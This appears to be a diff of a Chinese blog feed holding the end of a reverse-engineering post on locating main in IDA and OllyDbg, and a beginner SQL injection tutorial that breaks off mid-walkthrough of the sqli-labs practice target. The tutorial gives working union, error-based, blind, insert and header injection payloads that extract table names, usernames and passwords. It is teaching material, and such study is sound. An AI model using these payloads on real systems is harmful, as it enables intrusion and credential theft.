+<li><code>jmp</code> 跳转进去以后，就是main函数</li>
+</ul>
+<p><img data-src="/images/main/22.png"></p>
+<ul>
+<li>大部分程序都是一样的操作，熟练了很快就可以找到main函数</li>
+<li>接下来我再带大家看一下<code>MFC</code>编写的程序</li>
+</ul>
+<h2 id="MFC-debug版"><a href="#MFC-debug版" class="headerlink" title="MFC debug版"></a>MFC debug版</h2><ul>
+<li><p><strong><em>IDA</em></strong></p>
+</li>
+<li><p>先用IDA带大家看一下，先把程序拖入进IDA，选择exports–&gt;start</p>
+</li>
+</ul>
+<p><img data-src="/images/main/23.png"></p>
+<ul>
+<li>可以看到，IDA已经为我们解析出来了 <code>mainCRTStartup() </code></li>
+</ul>
+<p><img data-src="/images/main/24.png"></p>
+<ul>
+<li>进去以后，依旧选择第二个call</li>
+</ul>
+<p><img data-src="/images/main/25.png"></p>
+<ul>
+<li>往下翻到我们刚刚说的位置，找到exit，然后就可以看到<code>winmain</code>函数</li>
+</ul>
+<p><img data-src="/images/main/26.png"></p>
+<ul>
+<li>一直进去就可以到达目的地了</li>
+</ul>
+<p><img data-src="/images/main/27.png"></p>
+<p><img data-src="/images/main/28.png"></p>
+<ul>
+<li><strong><em>OD</em></strong></li>
+<li>接下来使用OD查找main函数</li>
+<li>进入第一个跳转</li>
+</ul>
+<p><img data-src="/images/main/29.png"></p>
+<ul>
+<li>选择第二个call</li>
+</ul>
+<p><img data-src="/images/main/30.png"></p>
+<ul>
+<li><p>因为这是一个MFC程序，所有我们需要找四个push，一个call，它的原型如下</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __clrcall <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">  HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>       nShowCmd</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img data-src="/images/main/31.png"></p>
+<ul>
+<li>继续跟进</li>
+</ul>
+<p><img data-src="/images/main/32.png"></p>
+<p><img data-src="/images/main/33.png"></p>
+<h2 id="MFC-release版"><a href="#MFC-release版" class="headerlink" title="MFC release版"></a>MFC release版</h2><ul>
+<li><strong><em>IDA</em></strong></li>
+<li>继续先用IDA查看</li>
+<li>选择 exports –&gt; start</li>
+</ul>
+<p><img data-src="/images/main/34.png"></p>
+<ul>
+<li>选择 <code>jmp ___tmainCRTStartup</code> ，进去后需要一直往下找，找到两个exit，然后才能看到，因为release的已经被优化过了</li>
+</ul>
+<p><img data-src="/images/main/35.png"></p>
+<ul>
+<li>看到这里，是不是感觉寻找main函数变得很简单，如果能熟练的寻找的一个程序的main函数，恭喜你，已经成功踏出了第一步</li>
+</ul>
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入入门教程</title>
+    <url>/SQL%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html</url>
+    <content><![CDATA[<h1 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h1><ul>
+<li>服务器端没有严格校验客户端发送的数据，导致服务器端的SQL指令被成功的恶意修改并执行的行为被称为SQL注入</li>
+</ul>
+<a id="more"></a>
+
+
+
+<ul>
+<li>本节不涉及高级的技术，如避开过滤，绕开防御，SQL注入防御技巧等，仅供初学者参考</li>
+</ul>
+<h1 id="SQL注入攻击流程"><a href="#SQL注入攻击流程" class="headerlink" title="SQL注入攻击流程"></a>SQL注入攻击流程</h1><h2 id="判断是否存在注入点-后端是否严格校验"><a href="#判断是否存在注入点-后端是否严格校验" class="headerlink" title="判断是否存在注入点(后端是否严格校验)"></a>判断是否存在注入点(后端是否严格校验)</h2><ul>
+<li>客户端提供不同的数据，测试服务器是否返回不同的结果</li>
+<li>提供畸形的输入，根据返回的结果确定注入类型<ul>
+<li>搭配 and 1 %23 等简单的指令查看用户的输入是否被作为 SQL 指令的一部分执行</li>
+<li>如果数据和错误都被显示，可以考虑普通联合查询方式注入</li>
+<li>如果数据不被显示，但是错误信息被显示，可以考虑报错注入 + 双注入</li>
+<li>如果能够知道是否成功，可以考虑布尔盲注（比较）</li>
+<li>如果什么都没有提示，可以考虑时间盲注（sleep + if）</li>
+</ul>
+</li>
+<li>构建合理(闭合)的指令查询信息，获取想要得到的数据</li>
+</ul>
+<h2 id="通过SQL指令获取到想要的数据"><a href="#通过SQL指令获取到想要的数据" class="headerlink" title="通过SQL指令获取到想要的数据"></a>通过SQL指令获取到想要的数据</h2><ul>
+<li><p>查询到字段的数量</p>
+<ul>
+<li><p>联合查询：允许同时执行多条语句并输出，要求查询的字段数相同</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">union <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,......;     <span class="comment">-- 直到没有报错</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>排序语句，对输出结果进行排序</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ORDER BY index;        <span class="comment">-- 直到没有报错</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>获取数据库的基本信息</p>
+<ul>
+<li>version()：版本信息，用于查找漏洞</li>
+<li>database()：当前使用数据库名称，用于进一步获取后面的数据</li>
+<li>user()：保存了数据库的地址以及当前登录的用户名</li>
+</ul>
+</li>
+<li><p>获取到的数据库的表名以及字段名(information_schema)</p>
+<ul>
+<li><p>TABLES：保存了所有的表和数据库之间的信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 获取所有的数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, TABLE_SCHEMA <span class="keyword">FROM</span> <span class="keyword">TABLES</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取指定的数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, TABLE_SCHEMA <span class="keyword">FROM</span> <span class="keyword">TABLES</span> <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="keyword">DATABASE</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 通过一条输出获取指定数据库</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(TABLE_NAME),<span class="keyword">group_concat</span>(TABLE_SCHEMA) <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="keyword">DATABASE</span>() %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 当前的数据库有哪些表</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="keyword">DATABASE</span>();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>COLUMNS：所有的字段和表直接的信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 获取所有表的所有字段</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, COLUMN_NAME <span class="keyword">FROM</span> <span class="keyword">COLUMNS</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 在获取所有表名的基础上，查询关注的表</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, COLUMN_NAME <span class="keyword">FROM</span> <span class="keyword">COLUMNS</span> <span class="keyword">WHERE</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 指定的表中有哪些字段</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME, COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME=<span class="string">&#x27;表名&#x27;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过前面查询到的关键表以及字段的名字进行下一步查询</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>), <span class="keyword">group_concat</span>(<span class="keyword">password</span>), <span class="keyword">group_concat</span>(username) <span class="keyword">FROM</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><ul>
+<li>本节不涉及</li>
+</ul>
+<h1 id="SQL注入-常见注入类型以及注入方法"><a href="#SQL注入-常见注入类型以及注入方法" class="headerlink" title="SQL注入-常见注入类型以及注入方法"></a>SQL注入-常见注入类型以及注入方法</h1><ul>
+<li>对于初学者来说，前边的看不懂没有关系，接下来便会正式讲解这些指令</li>
+</ul>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><ul>
+<li><p><strong><em>数字型</em></strong></p>
+<ul>
+<li><p>id=$id</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://test.php?id=1 and 1=1    返回成功</span><br><span class="line">http://test.php?id=1 and 1=2    返回失败</span><br><span class="line"></span><br><span class="line">为什么会这样呢？首先，and 的左边返回的是成功的，我们是在这个id存在的情况下加入的注入语句，而在 and 的右边，1=1也是成立的，所以语句返回的还是成功，但是由于1=2不成立，and 语句的判断逻辑是只要有一个不成立，就返回失败，所以1=2最后会返回的是失败</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong><em>字符型</em></strong></p>
+<ul>
+<li><p>id=’$id’</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://test.php?id=1&#x27; and &#x27;1&#x27;=&#x27;1 返回成功</span><br><span class="line">http://test.php?id=1&#x27; and &#x27;1&#x27;=&#x27;2 返回失败</span><br><span class="line"></span><br><span class="line">关键是构造闭合，这里语句就变成了......WHERE id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong><em>搜索型</em></strong></p>
+<ul>
+<li><p>text LIKE ‘%{GET[ ‘search’ ]}%’ “</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://test.php?text=text%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line"></span><br><span class="line">http://test.php?text=text%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="SQL注入时注意的MySql数据库注释"><a href="#SQL注入时注意的MySql数据库注释" class="headerlink" title="SQL注入时注意的MySql数据库注释"></a>SQL注入时注意的<code>MySql</code>数据库注释</h2><ul>
+<li><code>MySql</code>数据库支出三种注释<ul>
+<li>#：注释当前字符到末尾</li>
+<li>–：注释当前字符到末尾，–后面至少跟一个空格</li>
+<li>/**/：多行注释</li>
+</ul>
+</li>
+<li>实际进行注入过程中，建议使用 %23 进行注释</li>
+</ul>
+<h2 id="注入方式-get-amp-post-的区别"><a href="#注入方式-get-amp-post-的区别" class="headerlink" title="注入方式 get&amp;post 的区别"></a>注入方式 get&amp;post 的区别</h2><ul>
+<li>Get 方式用 <code>url</code> 提交注入数据</li>
+<li>Post 方式是使用抓包工具修改 post 数据部分提交注入</li>
+</ul>
+<h2 id="基于函数报错信息"><a href="#基于函数报错信息" class="headerlink" title="基于函数报错信息"></a>基于函数报错信息</h2><ul>
+<li><p>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端</p>
+</li>
+<li><p><code>Updatexml(XML_document, XPath_string, new_value)</code>：<code>mysql</code> 对 xml 文件数据进行查询和修改的 <code>xpath</code> 函数</p>
+<ul>
+<li>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称</li>
+<li>第二个参数：XPath_string（XPath格式的字符串）</li>
+<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">concat：将两个字符串连接为一个字符串</span><br><span class="line">limit：检索查询返回的行的一部分</span><br><span class="line">0x7e：是一个波浪符，&#x27;~&#x27;，防止被转义</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1. 获取基本信息</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,version()),0)<span class="comment"># 获取版本</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,database()),0)<span class="comment"># 获取数据库名</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,user()),0)<span class="comment"># 获取用户名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取当前数据库的所有表名（一次获取一个）</span></span><br><span class="line">x&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;数据库名&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 获取表的列名 (一次获取一个)</span></span><br><span class="line">x<span class="string">&#x27; and updatexml(1,concat(0x7e,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>数据库名<span class="string">&#x27; and TABLE_NAME=&#x27;</span>表名<span class="string">&#x27; limit 0,1)),0)# </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 4. 获取表的内容 （一次获取一个）</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)<span class="comment"># </span></span><br><span class="line">x<span class="string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)# </span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">right</span>(<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">10</span>),<span class="number">0</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p><code>extractvalue()</code>：<code>mysql</code> 对于 xml 文档数据进行查询的 <code>xpath</code> 函数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">x&#x27; and extractvalue(0,concat(0x7e,version()),0)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p><code>floor()</code>：<code>mysql</code> 中用来取整的函数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">x&#x27; and (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) a )<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ul>
+<li><p>什么是盲注</p>
+<ul>
+<li>在有些情况下，后台使用了错误信息屏蔽方法，屏蔽了报错，此时无法再根据报错信息来进行注入的判断，这种情况下的注入，称为“盲注”</li>
+</ul>
+</li>
+<li><p>盲注分为两种</p>
+<ul>
+<li><p>基于布尔</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr     查找字符串中的子串</span><br><span class="line">ascii    将字符转为ascii码</span><br><span class="line">right    获取字符串的右边子串</span><br><span class="line">left    获取字符串的左边子串</span><br><span class="line">length    求长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())=<span class="number">2</span>    求数据库名长度并判断是否等于<span class="number">2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;p&#x27;</span>    查看数据名的第一个字符并判断是否是p</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 判断是否有盲注</span></span><br><span class="line">x<span class="string">&#x27; and 1=1#    正常查询</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span><span class="comment">#    返回的结果不一样</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1. 获取基本信息</span></span><br><span class="line"><span class="comment">-- 1.1 获取数据库名的长度</span></span><br><span class="line">x<span class="string">&#x27; and length(database())=2#</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">length</span>(<span class="keyword">database</span>())&gt;<span class="number">1</span><span class="comment">#</span></span><br><span class="line">x<span class="string">&#x27; and length(database())&lt;3#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 1.2 获取数据库名</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;p&#x27;</span><span class="comment">#</span></span><br><span class="line">x<span class="string">&#x27; and ascii(substr(database(),1,1))=112#</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取当前数据库的所有表名</span></span><br><span class="line"><span class="comment">-- 2.1 获取第一个表</span></span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.2 获取第一个表的第一个字符</span></span><br><span class="line">x<span class="string">&#x27; and substr((select TABLE_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>a<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 3. 获取表的列名</span></span><br><span class="line"><span class="string">-- 3.1 获取第一个列名</span></span><br><span class="line"><span class="string">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; and TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 3.2 获取第一个列名的第一个字符</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">substr</span>((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COULMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;i&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 获取表的内容</span></span><br><span class="line">x<span class="string">&#x27; and substr((select username from users limit 0,1),1,1)=&#x27;</span>a<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>基于时间</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">x&#x27; and sleep(5)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1. 获取基本信息</span></span><br><span class="line"><span class="comment">-- 1.1 获取数据库名的长度</span></span><br><span class="line">x&#x27; and if((length(database())=2),sleep(5),null)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 1.2 获取数据名的第一个字符</span></span><br><span class="line">x&#x27; and if((substr(database(),1,1)=&#x27;p&#x27;),sleep(5),null)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 获取当前数据库的所有表名</span></span><br><span class="line"><span class="comment">-- 2.1 获取第一个表</span></span><br><span class="line"><span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.2 获取第一个表的第一个字符</span></span><br><span class="line">x<span class="string">&#x27; and if(substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; limit 0,1),1,1)=&#x27;</span>h<span class="string">&#x27;,sleep(5),null)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 3. 获取表的列名</span></span><br><span class="line"><span class="string">-- 3.1 获取第一个列名</span></span><br><span class="line"><span class="string">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;</span>pk<span class="string">&#x27; and TABLE_NAME=&#x27;</span><span class="keyword">users</span><span class="string">&#x27; limit 0,1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 3.2 获取第一个列名的第一个字符</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;i&#x27;</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="literal">null</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 获取表的内容</span></span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4.1 查询第一个用户名的第一个字符</span></span><br><span class="line">x<span class="string">&#x27; and if(substr((select username from users limit 0,1),1,1)=&#x27;</span>a<span class="string">&#x27;,sleep(5),null)#</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><ul>
+<li>获取基本信息</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">x&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;</span><br><span class="line">x&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span><br><span class="line">x&#x27; or updatexml(1,concat(0x7e,user()),0) or&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取当前数据库的所有表名(一次获取一个)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">x&#x27; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取表的列名(一次获取一个)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">x&#x27; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">&#x27;pk&#x27;</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取表的内容(一次获取一个)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">x&#x27; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><ul>
+<li>注入点</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie：&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span><br><span class="line">User-Agent：&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span><br><span class="line">Accept：&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h1><ul>
+<li>接下来就用实战的方式来巩固这些内容，当然，不是真的去攻击网站，只是用靶机尝试</li>
+<li>这里我用到的靶机是 <code>sqli-labs</code>，非常适合新手练习</li>
+<li>我会带着大家做一部分关卡进行练习</li>
+</ul>
+<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><img data-src="/images/sql/2.png"></p>
+<ul>
+<li><p>发现第一关是基于单引号的字符型注入</p>
+</li>
+<li><p>这里我们一步一步来，先构造一条最简单的语句 <code>?id=1</code></p>
+<p><img data-src="/images/sql/1.png"></p>
+</li>
+<li><p>可以看到有内容显示，显示了 name 和 password</p>
+</li>
+<li><p>因为是基于单引号的报错，可以输入 <code>?id=1&#39;</code> </p>
+<p><img data-src="/images/sql/3.png"></p>
+</li>
+<li><p>从报错信息可以看出，单引号也被带入了查询，<code>1&#39;&#39; LIMIT 0,1&#39;</code> ，这里可以看出是闭合的问题，<code>1&#39;</code>后边的数据可以都丢掉，之前说过，最好不要用 # 注释，因为 # 这种特殊符号都被转义了，建议使用 %23</p>
+<p><img data-src="/images/sql/4.png"></p>
+<p><img data-src="/images/sql/5.png"></p>
+</li>
+<li><p>没有报错，说明闭合成功，接下来就可以构造查询语句，获取数据库的信息</p>
+</li>
+<li><p>使用 union 查询，获取当前查询的列数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?id=1&#x27;  union <span class="keyword">select</span> <span class="number">1</span> %<span class="number">23</span></span><br><span class="line">payload：?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27;  union select 1,2 %23</span></span><br><span class="line"><span class="string">payload：?id=1&#x27;</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/6.png"></p>
+<p><img data-src="/images/sql/7.png"></p>
+<p><img data-src="/images/sql/8.png"></p>
+</li>
+<li><p>发现查询到第三条没有报错，可以确认列数就是3</p>
+</li>
+<li><p>为了能够将后边构造的的数据显示在界面上，需要将前边的数据屏蔽掉，让构造的<code>id=-1</code></p>
+<p><img data-src="/images/sql/9.png"></p>
+</li>
+<li><p>可以看到2和3都显示了出来，将它们换成其他的函数，获取信息</p>
+</li>
+<li><p>获取数据库名：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">payload：?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/sql/10.png"></p>
+</li>
+<li><p>获取表名：</p>
